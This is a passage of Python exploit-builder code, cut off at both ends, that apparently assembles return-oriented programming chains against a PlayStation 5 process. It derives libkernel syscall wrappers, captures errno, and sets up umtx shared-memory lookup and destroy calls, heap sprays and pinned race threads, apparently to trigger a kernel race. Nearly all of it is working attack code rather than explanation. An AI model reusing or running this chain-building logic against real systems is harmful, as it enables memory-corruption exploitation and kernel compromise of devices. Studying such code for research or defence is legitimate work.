                syscall_arg(5, args.lowrop_direct_syscall_arg5),
                syscall_arg(6, args.lowrop_direct_syscall_arg6),
            ]
            struct.pack_into("<Q", msg, 0x18, args.lowrop_direct_syscall_num & 0xFFFFFFFFFFFFFFFF)
            for i, value in enumerate(args_supplied):
                struct.pack_into("<Q", msg, 0x20 + i * 8, value)

            # Load the imported libkernel[_sys] wrapper, then derive a landing
            # inside it.  Landing at wrapper+7 starts at "mov r10, rcx; syscall"
            # on the PS5 wrapper layout, so rax remains our chosen syscall ID.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            wrapper_offset = args.lowrop_direct_syscall_wrapper_offset
            if wrapper_offset is None:
                wrapper_offset = source_off
            target_delta = wrapper_offset - source_off
            if target_delta:
                emit_pop_rdx_padded(target_delta)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emit_pop_rdx_padded(args.lowrop_direct_syscall_landing_adjust)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if args.lowrop_direct_syscall_sixargs:
                pivot_off = 0x100
                pivot_addr = msg_addr + pivot_off
                post_addr = pivot_addr + 0x08
                if len(msg) < 0x300:
                    raise RuntimeError("direct-syscall sixargs mode needs at least 0x300 bytes of message space")

                post = bytearray()

                def post_emitq(value):
                    post.extend(pack64(value))

                def post_emit_pop_rdx_padded(value):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                    post_emitq(value)
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    post.extend(b"ROP")
                    post_emitq(0)

                def post_emit_aligned_call(func_addr):
                    cur_addr = post_addr + len(post)
                    if (cur_addr & 0xF) == 0:
                        post_emitq(func_addr)
                        return
                    need = (8 - ((cur_addr + 16) & 0xF)) & 0xF
                    ret_off, imm = REDIS_EBOOT_RET_IMM_BY_MOD[need]
                    post_emitq(args.eboot_base + ret_off)
                    post_emitq(func_addr)
                    post.extend(b"\x00" * imm)

                def post_store_rax(dst_addr):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(dst_addr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                post_store_rax(msg_addr)
                if args.lowrop_direct_syscall_capture_errno:
                    errno_ptr_slot = 0x50
                    errno_val_slot = 0x58
                    qwords_from_source_to_errno_ptr = (errno_ptr_off - source_off) // 8
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(source_got)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    post_emit_pop_rdx_padded(qwords_from_source_to_errno_ptr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                    post_store_rax(msg_addr + errno_ptr_slot)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    post_store_rax(msg_addr + errno_val_slot)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                post_emitq(args.dispatch_fd)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                post_emitq(msg_addr)
                post_emit_pop_rdx_padded(len(msg))
                post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                post_emitq(0)
                if pivot_off + 0x08 + len(post) > len(msg):
                    raise RuntimeError("direct-syscall sixargs post-chain does not fit in message buffer")
                msg[pivot_off + 0x08:pivot_off + 0x08 + len(post)] = post

                # msg+pivot_off = runtime-derived syscall landing target.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x08)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_store_rax(pivot_addr)

                # Zero r8/r9 via send(fd, msg, 0, 0).  The send wrapper is
                # sendto-backed and clears r8/r9 before syscall entry.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(args_supplied[4])
                emitq(0)  # skipped by add rsp, 8
                emitq(0)  # rbx
                emitq(0)  # rbp
                emit_pop_rdx_padded(args_supplied[2])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(args_supplied[3])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args_supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args_supplied[1])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(args.lowrop_direct_syscall_num & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(pivot_addr)
            else:
                emit_pop_rdx_padded(args_supplied[2])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x08)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RCX_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args_supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args_supplied[1])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(args.lowrop_direct_syscall_num & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_JMP_RCX)

                # The wrapper's ret returns here.  Store syscall return value.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                if args.lowrop_direct_syscall_capture_errno:
                    qwords_from_source_to_errno_ptr = (errno_ptr_off - source_off) // 8
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(source_got)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_pop_rdx_padded(qwords_from_source_to_errno_ptr)
                    emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x38)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x40)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_umtx2_wrapper_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETPID_GOT
            source_off = LIBKERNEL_SYS_GETPID
            direct_source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_wrapper_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_derive_sys_wrapper(wrapper_off):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(source_got)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                delta = wrapper_off - source_off
                if delta and delta % 8 == 0:
                    emit_pop_rdx_padded(delta // 8)
                    emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                elif delta:
                    emit_pop_rdx_padded(delta)
                    emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)

            def emit_zero_tail_args():
                # libkernel_sys send(fd, msg, 0, 0) is a quiet call that leaves
                # the tail syscall argument registers in a known-zero state.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

            def emit_umtx_wrapper_call(wrapper_off, supplied, result_off):
                if isinstance(supplied[0], tuple):
                    raise RuntimeError("wrapper preflight only supports immediate arg0")
                emit_zero_tail_args()
                emit_derive_sys_wrapper(wrapper_off)
                emit_wrapper_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(0)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                emit_store_rax(msg_addr + result_off)

            def emit_direct_arg0(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_direct_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x18)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_direct_arg0(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            def emit_capture_sys_errno(ptr_result_off, val_result_off):
                emit_derive_sys_wrapper(LIBKERNEL_SYS_ERRNO_PTR)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                emit_store_rax(msg_addr + ptr_result_off)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emit_store_rax(msg_addr + val_result_off)

            emit_derive_sys_wrapper(source_off)
            emit_store_rax(msg_addr + 0x10)
            emit_derive_sys_wrapper(LIBKERNEL_SYS_UMTX_OP)
            emit_store_rax(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(direct_source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emit_store_rax(msg_addr + 0x18)

            umtx_key = msg_addr + 0x200
            emit_umtx_wrapper_call(LIBKERNEL_SYS_UMTX_OP, [0, 26, 0x0001, umtx_key], 0x20)
            emit_capture_sys_errno(0x58, 0x60)
            emit_direct_syscall(0x1E0, [("mem64", msg_addr + 0x20), 0x4000, 0, 0, 0, 0], 0x28, 0x600)
            emit_umtx_wrapper_call(LIBKERNEL_SYS_UMTX_OP, [0, 26, 0x0002, umtx_key], 0x30)
            emit_capture_sys_errno(0x68, 0x70)
            emit_direct_syscall(0x0BD, [("mem64", msg_addr + 0x30), msg_addr + 0x300, 0, 0, 0, 0], 0x38, 0x680)
            emit_umtx_wrapper_call(LIBKERNEL_SYS_UMTX_OP, [0, 26, 0x0004, umtx_key], 0x40)
            emit_capture_sys_errno(0x78, 0x80)
            emit_direct_syscall(0x006, [("mem64", msg_addr + 0x20), 0, 0, 0, 0, 0], 0x48, 0x700)
            emit_direct_syscall(0x006, [("mem64", msg_addr + 0x30), 0, 0, 0, 0, 0], 0x50, 0x780)

        elif lowrop_umtx2_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_umtx_arg0(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_umtx_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_umtx_arg0(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            umtx_key = msg_addr + 0x200
            emit_umtx_syscall(0x1C6, [0, 26, 0x0001, umtx_key, 0, 0], 0x20, 0x500)
            emit_umtx_syscall(0x1E0, [("mem64", msg_addr + 0x20), 0x4000, 0, 0, 0, 0], 0x28, 0x580)
            emit_umtx_syscall(0x1C6, [0, 26, 0x0002, umtx_key, 0, 0], 0x30, 0x600)
            emit_umtx_syscall(0x0BD, [("mem64", msg_addr + 0x30), msg_addr + 0x300, 0, 0, 0, 0], 0x38, 0x680)
            emit_umtx_syscall(0x1C6, [0, 26, 0x0004, umtx_key, 0, 0], 0x40, 0x700)
            emit_umtx_syscall(0x006, [("mem64", msg_addr + 0x20), 0, 0, 0, 0, 0], 0x48, 0x780)
            emit_umtx_syscall(0x006, [("mem64", msg_addr + 0x30), 0, 0, 0, 0, 0], 0x50, 0x800)

        elif lowrop_umtx2_spray_existing:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT
            spray_count = max(1, min(args.lowrop_umtx2_spray_count, 16))
            secondary_key = msg_addr + 0x200

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_spray_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_spray_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_spray_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_spray_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_spray_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            def emit_spray_checkpoint(size=0x900):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(size)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

            emit_store_imm64(msg_addr + 0x18, 1)
            emit_spray_checkpoint()
            segment_off = 0x700
            for i in range(spray_count):
                fd_slot = 0x500 + i * 8
                trunc_ret_slot = 0x600 + i * 8
                destroy_ret_slot = 0x680 + i * 8
                size_value = 0x100000 + i * 0x4000
                emit_spray_syscall(0x1C6, [0, 26, 0x0001, secondary_key, 0, 0], fd_slot, segment_off)
                segment_off += 0x80
                if spray_count <= 2:
                    emit_store_imm64(msg_addr + 0x18, 0x10 + i)
                    emit_spray_checkpoint()
                emit_spray_syscall(0x1E0, [("mem64", msg_addr + fd_slot), size_value, 0, 0, 0, 0], trunc_ret_slot, segment_off)
                segment_off += 0x80
                if spray_count <= 2:
                    emit_store_imm64(msg_addr + 0x18, 0x30 + i)
                    emit_spray_checkpoint()
                emit_spray_syscall(0x1C6, [0, 26, 0x0004, secondary_key, 0, 0], destroy_ret_slot, segment_off)
                segment_off += 0x80
                if spray_count <= 2:
                    emit_store_imm64(msg_addr + 0x18, 0x50 + i)
                    emit_spray_checkpoint()
            emit_spray_syscall(0x0BD, [args.lowrop_umtx2_existing_fd, msg_addr + 0x300, 0, 0, 0, 0], 0x30, segment_off)
            segment_off += 0x80
            emit_store_imm64(msg_addr + 0x18, 0x70)
            emit_spray_checkpoint()
            for i in range(spray_count):
                fd_slot = 0x500 + i * 8
                close_ret_slot = 0x780 + i * 8
                emit_spray_syscall(0x006, [("mem64", msg_addr + fd_slot), 0, 0, 0, 0, 0], close_ret_slot, segment_off)
                segment_off += 0x80
                if spray_count <= 2:
                    emit_store_imm64(msg_addr + 0x18, 0x90 + i)
                    emit_spray_checkpoint()

        elif lowrop_umtx2_race_one:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT
            inline_spray_count = max(0, min(args.lowrop_umtx2_inline_spray_count, 16))
            worker_spray = args.lowrop_umtx2_worker_spray
            worker_spray_gate = args.lowrop_umtx2_worker_spray_gate
            worker_spray_post_yields = max(0, min(args.lowrop_umtx2_worker_spray_post_yields, 8))
            main_tag_worker_fds = args.lowrop_umtx2_main_tag_worker_fds
            race_debug_checkpoints = args.lowrop_umtx2_race_debug
            destroy_delay_target = args.lowrop_umtx2_destroy_delay_target
            destroy_delay_yields = max(0, min(args.lowrop_umtx2_destroy_delay_yields, 2))
            destroy_pad_target = args.lowrop_umtx2_destroy_pad_target
            destroy_pad_count = max(0, min(args.lowrop_umtx2_destroy_pad_count, 64))

            key_off = 0x200
            secondary_key_off = 0x210
            stat_off = 0x300
            barrier_pair_off = 0x400
            read_fd_qword_off = 0x408
            write_fd_qword_off = 0x410
            barrier_buf_off = 0x418
            spray_pair_off = 0x4C0
            spray_read_fd_qword_off = 0x4C8
            spray_write_fd_qword_off = 0x4D0
            spray_buf_off = 0x4D8
            thread_specs = [
                {
                    "args": 0x500,
                    "child": 0x680,
                    "parent": 0x688,
                    "stack": 0x700,
                    "stack_size": 0x300,
                    "rop": 0xA40,
                    "tls": 0xF00,
                    "byte": 0x420,
                    "ready": 0xB0,
                    "read_ret": 0xB8,
                    "result": 0xA8,
                    "done": 0xC0,
                    "exit_ret": 0xC8,
                    "cpuset_ret": 0x180,
                    "rtprio_ret": 0x198,
                    "mask": 0x430,
                    "rtprio": 0x490,
                    "core": 15,
                    "prio": 400,
                    "op": 0x0002,  # UMTX_SHM_LOOKUP
                    "segment": 0x2100,
                },
                {
                    "args": 0x580,
                    "child": 0x690,
                    "parent": 0x698,
                    "stack": 0x1000,
                    "stack_size": 0x300,
                    "rop": 0x1340,
                    "tls": 0x1800,
                    "byte": 0x421,
                    "ready": 0xD8,
                    "read_ret": 0xE0,
                    "result": 0xD0,
                    "done": 0xE8,
                    "exit_ret": 0xF0,
                    "cpuset_ret": 0x188,
                    "rtprio_ret": 0x1A0,
                    "mask": 0x450,
                    "rtprio": 0x498,
                    "core": 13,
                    "prio": 256,
                    "op": 0x0004,  # UMTX_SHM_DESTROY
                    "segment": 0x2400,
                },
                {
                    "args": 0x600,
                    "child": 0x6A0,
                    "parent": 0x6A8,
                    "stack": 0x1900,
                    "stack_size": 0x300,
                    "rop": 0x1C40,
                    "tls": 0x2200,
                    "byte": 0x422,
                    "ready": 0x100,
                    "read_ret": 0x108,
                    "result": 0xF8,
                    "done": 0x110,
                    "exit_ret": 0x118,
                    "cpuset_ret": 0x190,
                    "rtprio_ret": 0x1A8,
                    "mask": 0x470,
                    "rtprio": 0x4A0,
                    "core": 14,
                    "prio": 256,
                    "op": 0x0004,  # UMTX_SHM_DESTROY
                    "segment": 0x2680,
                },
            ]
            if worker_spray:
                thread_specs[0].update({"stack": 0x700, "rop": 0x1040, "tls": 0x2700, "segment": 0x2D00})
                thread_specs[1].update({"stack": 0xA00, "rop": 0x1540, "tls": 0x2780, "segment": 0x2F40})
                thread_specs[2].update({"stack": 0xD00, "rop": 0x2040, "tls": 0x2800, "segment": 0x3340})
            worker_segments = []

            for spec in thread_specs:
                stack_off = spec["stack"]
                thread_stack_size = spec["stack_size"]
                thr_args_off = spec["args"]
                struct.pack_into("<Q", msg, stack_off + thread_stack_size, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                struct.pack_into("<Q", msg, stack_off + thread_stack_size + 8, msg_addr + spec["rop"])
                struct.pack_into("<Q", msg, thr_args_off + 0x00, args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                struct.pack_into("<Q", msg, thr_args_off + 0x08, 0)
                struct.pack_into("<Q", msg, thr_args_off + 0x10, msg_addr + stack_off)
                struct.pack_into("<Q", msg, thr_args_off + 0x18, thread_stack_size)
                struct.pack_into("<Q", msg, thr_args_off + 0x20, msg_addr + spec["tls"])
                struct.pack_into("<Q", msg, thr_args_off + 0x28, 0x80)
                struct.pack_into("<Q", msg, thr_args_off + 0x30, msg_addr + spec["child"])
                struct.pack_into("<Q", msg, thr_args_off + 0x38, msg_addr + spec["parent"])
                struct.pack_into("<QQ", msg, spec["mask"], 1 << spec["core"], 0)
                struct.pack_into("<HH", msg, spec["rtprio"], 2, spec["prio"])

            def build_umtx_thread(spec):
                thread = bytearray()

                def tq(value):
                    thread.extend(pack64(value))

                def t_pop_rdx_padded(value):
                    tq(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                    tq(value)
                    tq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    thread.extend(b"ROP")
                    tq(0)

                def t_rax_to_rdi():
                    tq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                    for _ in range(5):
                        tq(0)

                def t_rdi_arg(value):
                    if isinstance(value, tuple) and value[0] == "mem64":
                        tq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                        tq(value[1])
                        tq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                        t_rax_to_rdi()
                    else:
                        tq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                        tq(value & 0xFFFFFFFFFFFFFFFF)

                def t_store_imm64(dst_addr, value):
                    tq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    tq(dst_addr)
                    tq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    tq(value)
                    tq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                def t_syscall(sysno, supplied, result_off, segment_off):
                    segment_addr = msg_addr + segment_off
                    worker_segments.append(segment_off)

                    tq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                    tq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                    tq(0)
                    tq(0)
                    tq(0)
                    t_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                    tq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    tq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                    t_rdi_arg(supplied[0])
                    tq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    tq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                    tq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    tq(sysno & 0xFFFFFFFFFFFFFFFF)
                    tq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                    tq(segment_addr)

                    resume_addr = msg_addr + spec["rop"] + len(thread)
                    segment = bytearray()
                    for q in (
                        0,
                        args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                        msg_addr + result_off,
                        args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                        args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                        resume_addr,
                    ):
                        segment.extend(pack64(q))
                    msg[segment_off:segment_off + len(segment)] = segment

                t_syscall(
                    0x1E8,
                    [3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, msg_addr + spec["mask"], 0],
                    spec["cpuset_ret"],
                    spec["segment"],
                )
                t_syscall(
